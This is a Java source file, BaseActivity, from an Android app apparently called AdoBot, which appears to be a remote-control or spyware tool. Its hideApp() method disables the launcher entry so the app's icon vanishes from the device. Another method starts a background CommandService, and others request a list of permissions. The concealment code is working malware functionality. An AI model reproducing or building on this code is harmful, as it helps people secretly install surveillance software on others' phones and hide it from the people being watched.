package com.android.adobot.activities;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.PersistableBundle;
import android.support.v7.app.AppCompatActivity;

import com.android.adobot.CommandService;
import com.android.adobot.Constants;

import pub.devrel.easypermissions.EasyPermissions;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

/**
 * Created by adones on 2/26/17.
 */

public class BaseActivity extends AppCompatActivity {

    @Override
    public void onCreate(Bundle savedInstanceState, PersistableBundle persistentState) {
        super.onCreate(savedInstanceState, persistentState);
    }

    protected void hideApp() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, SetupActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    protected void startClient() {
        Intent i = new Intent(this, CommandService.class);
        startService(i);
    }

    protected void requestPermissions() {
        Intent i = new Intent(this, PermissionsActivity.class);
        i.addFlags(FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    protected boolean hasPermissions() {
        return EasyPermissions.hasPermissions(this, Constants.PERMISSIONS);
    }
}
